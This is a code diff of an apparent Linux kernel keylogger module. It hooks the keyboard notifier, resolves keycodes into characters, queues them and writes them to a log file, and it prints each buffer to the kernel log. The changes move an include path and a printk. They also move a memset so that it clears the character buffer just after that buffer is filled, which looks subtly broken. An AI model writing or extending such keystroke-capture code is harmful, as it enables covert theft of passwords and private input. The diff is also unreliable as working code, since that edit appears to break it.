@@ -6,7 +6,7 @@
 #include <linux/fs.h>
 #include <linux/file.h>
 
-#include "headers.h"
+#include "includes/headers.h"
 
 /*
     Helpful sources:
@@ -67,11 +67,12 @@ size_t resolve_keycode(int keycode, int is_shift, char *buffer, size_t buffer_si
 }
 
 ssize_t write_to_file(char *buffer) {
-    printk(KERN_DEBUG "Writing buffer %s", buffer);
+	
 
     struct file *file;
     ssize_t ret = 0, len = 0;
 
+    printk(KERN_DEBUG "Writing buffer %s", buffer);
     file = filp_open(FILE_PATH, O_RDWR | O_CREAT, 0644);
     if (IS_ERR(file)) {
         printk(KERN_DEBUG "Failed to open log file");
@@ -103,7 +104,6 @@ int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, 
     struct keyboard_notifier_param *keyboard_event = (struct keyboard_notifier_param *)nb_ptr; // Cast pointer to correct type
     
     char character_buff[BUFF_SIZE];
-    memset(character_buff, 0x0, BUFF_SIZE);
 
     size_t keystr_len = resolve_keycode(
         keyboard_event->value, 
@@ -111,9 +111,11 @@ int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, 
         character_buff, 
         BUFF_SIZE
     );
-    
+     memset(character_buff, 0x0, BUFF_SIZE);
+     
     // Why down? This way we ommit showing a character 2 times
-    if ((keystr_len >= 1) && !(keyboard_event->down)) {
+   
+  if ((keystr_len >= 1) && !(keyboard_event->down)) {
         size_t curr_len = strlen(queued_chars);
         size_t new_len = strlen(character_buff);
         size_t total_needed = curr_len + 1 + new_len + 1;  // space + null terminator
